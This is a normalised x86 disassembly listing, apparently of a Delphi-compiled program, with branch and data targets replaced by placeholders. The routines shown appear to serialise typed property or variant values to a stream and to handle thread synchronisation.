mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414844
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
call sub_41f5d4
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax ]
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
mov edx ebx
call sub_41f6bc
pop ecx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f887
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41e500
jmp r-xdata
dec al
je r-xdata
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx ebx
call sub_4145c8
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41ec24
sub al 0x3
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_41f628
pop ecx
jmp r-xdata
jmp r-xdata
sub_41f88c
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414d74
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp + 0x8 ]
push eax
call sub_41f5d4
pop ecx
mov ax [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41eb94
mov esp ebp
pop ebp
retn
sub_41f8cc
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415190
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
push eax
call sub_41f5d4
pop ecx
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41ed5c
pop ecx
pop ecx
pop ebp
retn
sub_41f908
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41f95d
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414bb8
mov eax [ ebp + 0x8 ]
push eax
call sub_41f5d4
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_42056c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f964
lea eax [ ebp - 0x4 ]
call sub_4046c8
retn
sub_41f980
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41fa6f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp eax ebx
jne r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_40403c
jmp r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
mov edx r-xdata
call sub_40403c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fa76
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
mov eax esi
call sub_403fe8
mov eax esi
mov ecx r-xdata
mov edx [ ebx + 0x8 ]
call sub_4042f4
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x1c ]
mov eax edi
call sub_41f968
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
push r-xdata
push [ ebx + 0x8 ]
mov eax esi
mov edx 0x3
call sub_404368
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_41f980
pop ecx
push [ ebp - 0x4 ]
push r-xdata
push [ ebx + 0x8 ]
mov eax esi
mov edx 0x3
call sub_404368
jmp r-xdata
sub_41faa8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_41fc9c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414844
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41f5d4
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_420620
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fca3
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_40400c
retn
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x2c ]
call sub_404080
xor eax eax
push ebp
push sub_41fc1d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push [ eax + 0x2c ]
lea eax [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edx 0x1a
call sub_40424c
push [ ebp - 0x14 ]
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx 0x3
call sub_404368
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_41ee08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x20 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx [ ebp - 0xc ]
call sub_40403c
retn
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_414844
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x20 ] eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41f980
pop ecx
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41f5d4
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
call sub_41ec24
jmp r-xdata
sub_41fcb4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_41fd71
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4151f4
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_4058a8
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40cfa0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41f5d4
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_420620
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fd78
lea eax [ ebp - 0xc ]
call sub_403fe8
lea eax [ ebp - 0x8 ]
call sub_4058a8
lea eax [ ebp - 0x4 ]
call sub_4058a8
retn
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41f980
pop ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_41f5d4
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_41ec24
sub_41fd90
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41fe2b
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415118
mov eax [ ebp + 0x8 ]
push eax
call sub_41f5d4
pop ecx
mov ebx [ ebp - 0x8 ]
test ebx ebx
jne r-xdata
lea ecx [ ebp - 0x10c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax ]
mov edx ebx
call sub_40352c
lea edx [ ebp - 0x10c ]
lea eax [ ebp - 0xc ]
call sub_40424c
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41ec24
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_420620
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fe32
lea eax [ ebp - 0xc ]
call sub_403fe8
retn
sub_41fe38
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_41fe91
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415098
mov eax [ ebp + 0x8 ]
push eax
call sub_41f5d4
pop ecx
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41ffe8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fe98
lea eax [ ebp - 0x10 ]
call sub_40ec8c
retn
sub_41fe9c
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
push sub_420634
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_41f46c
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_41eed0
mov [ ebp - 0x11 ] al
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
movzx eax [ eax ]
cmp eax 0x10
ja r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_414844
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
jmp [ eax * 4 + jump_table_41ff5a ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_414844
test [ eax + 0x24 ] 0x4
je r-xdata
push ebp
call sub_41f7cc
pop ecx
jmp r-xdata
push ebp
call sub_41f88c
pop ecx
jmp r-xdata
push ebp
call sub_41f908
pop ecx
jmp r-xdata
push ebp
call sub_41faa8
pop ecx
jmp r-xdata
push ebp
call sub_41fd90
pop ecx
jmp r-xdata
push ebp
call sub_41fe38
pop ecx
jmp r-xdata
push ebp
call sub_41f8cc
pop ecx
jmp r-xdata
push ebp
call sub_41fcb4
pop ecx
sub_41ffe8
push ebp
mov ebp esp
add esp 0xfffffec4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x1c ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4203c4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_413e94
test al al
je r-xdata
mov eax ebx
call sub_413d2c
and ax 0xfff
movzx eax ax
cmp eax 0x7
jg r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
cmp eax 0x10
jge r-xdata
je r-xdata
add eax 0xfffffff0
sub eax 0x3
jb r-xdata
sub eax 0x8
je r-xdata
mov eax ebx
call sub_410f80
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41ec00
jmp r-xdata
cmp eax 0x6
ja r-xdata
mov eax ebx
call sub_40f630
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41ece8
jmp r-xdata
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x2c ]
mov edx ebx
call sub_4126b8
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_42056c
jmp r-xdata
sub eax 0x3
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4203cb
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_40400c
lea eax [ ebp - 0x34 ]
call sub_4058a8
lea eax [ ebp - 0x30 ]
call sub_403fe8
lea eax [ ebp - 0x2c ]
call sub_4046c8
lea eax [ ebp - 0x1c ]
call sub_4058a8
retn
xor eax eax
push ebp
push sub_420368
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov ax [ ebx ]
call sub_41418c
test al al
je r-xdata
jmp [ eax * 4 + jump_table_420066 ]
mov eax ebx
call sub_4100f4
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41ed5c
jmp r-xdata
sub eax 0xeb
je r-xdata
mov eax ebx
call sub_410a38
test al al
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x38 ]
mov edx ebx
call sub_411f90
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_420518
jmp r-xdata
lea eax [ ebp - 0x1c ]
call sub_4058a8
push eax
lea eax [ ebp - 0x34 ]
mov edx ebx
call sub_412c90
mov eax [ ebp - 0x34 ]
mov edx r-xdata
pop ecx
call sub_40cfa0
test al al
jne r-xdata
mov dl 0xd
mov eax [ ebp - 0x4 ]
call sub_420620
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_420620
jmp r-xdata
mov eax ebx
call sub_410f80
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41ebb8
jmp r-xdata
mov eax ebx
call sub_410f80
add esp 0xfffffff4
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41eb94
jmp r-xdata
mov eax ebx
call sub_4118dc
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41ebdc
jmp r-xdata
lea eax [ ebp - 0x30 ]
mov edx ebx
call sub_411f90
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_420518
jmp r-xdata
jmp r-xdata
mov dl 0x8
mov eax [ ebp - 0x4 ]
call sub_420620
jmp r-xdata
mov dl 0x9
mov eax [ ebp - 0x4 ]
call sub_420620
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_420357
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebp - 0x10 ] eax
push 0x400
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b3cc
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4202fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x13c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4031c0
lea edx [ ebp - 0x13c ]
lea eax [ ebp - 0x3c ]
call sub_40424c
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x14 ]
call sub_420518
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax [ ebp - 0x14 ]
call sub_41e400
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_41e400
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420304
mov eax [ ebp - 0x14 ]
call sub_403270
retn
sub_420304
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x18 ] eax
mov dl 0xa
mov eax [ ebp - 0x4 ]
call sub_420620
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_41e400
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41e400
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403270
mov eax [ ebp - 0xc ]
call sub_403270
retn
sub_4203e4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42042a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov ecx esi
mov edx [ ebx + 0x2c ]
call sub_4042f4
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_420438
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420431
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_420438
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_4042a8
mov [ esp ] eax
cmp [ esp ] 0xff
jle r-xdata
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41e400
mov eax esi
call sub_4044a8
mov edx eax
mov ecx [ esp ]
mov eax ebx
call sub_41e400
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xff
sub_420480
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_4043f4
je r-xdata
mov eax esi
call sub_4042a8
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
mov eax edi
call sub_4042a8
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_420620
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41e400
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_41e400
jmp r-xdata
mov dl 0xc
mov eax ebx
call sub_420620
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41e400
mov dl 0x6
mov eax ebx
call sub_420620
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41e400
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_41e400
sub_420518
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42055d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405d1c
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_420480
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420564
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_42056c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_420612
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_405bcc
mov eax [ ebp - 0x8 ]
call sub_4042a8
mov edi eax
mov eax ebx
call sub_404834
add eax eax
cmp edi eax
jge r-xdata
mov dl 0x12
mov eax esi
call sub_420620
mov eax ebx
call sub_404834
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax esi
call sub_41e400
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx ebx
mov eax esi
call sub_41e400
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_404270
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_420480
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420619
lea eax [ ebp - 0xc ]
call sub_403fe8
lea eax [ ebp - 0x8 ]
call sub_403fe8
retn
sub_420634
push ebp
mov ebp esp
push ebx
mov ebx [ eax + 0x20 ]
mov [ edx ] ebx
mov edx [ eax + 0x18 ]
mov [ ecx ] edx
mov edx [ ebp + 0xc ]
mov ecx [ eax + 0x1c ]
mov [ edx ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ eax + 0x28 ]
mov [ edx ] eax
pop ebx
pop ebp
retn 0x8
sub_4206cc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b760
call sub_403a24
call sub_4206a4
mov eax ebx
call sub_4206b0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_42085a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42083b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420842
mov eax [ ebp - 0xc ]
call sub_403270
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_418550
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_418440
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_420805
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4207d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_42086c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov al [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_420a24
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_4208b8
push ebx
push esi
push ecx
call sub_403624
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_420b0c
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_420ab4
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebx
call sub_418b20
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_420a7c
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_40360c
lea eax [ ebx + 0x14 ]
call sub_40cf90
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_418550
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_42093c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4185ac
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4183f4
mov edx ebx
mov eax esi
call sub_42093c
sub_4209d0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_4183f4
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebx + 0x10 ] eax
sub_4209fc
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_4186ec
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_403270
xor eax eax
mov [ ebx + 0x10 ] eax
sub_420a24
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_40346c
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_4209d0
mov dl 0x1
mov eax ebx
call sub_420f44
test [ edi + 0x1c ] 0x10
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_420ef4
sub_420a7c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_420f44
mov edx ebx
mov eax esi
call sub_4209fc
pop edi
pop esi
pop ebx
retn
sub_420ab4
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_418638
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_420a7c
jmp r-xdata
mov ax [ r-xdata ]
and ax [ esi + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_4209fc
sub_420b0c
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
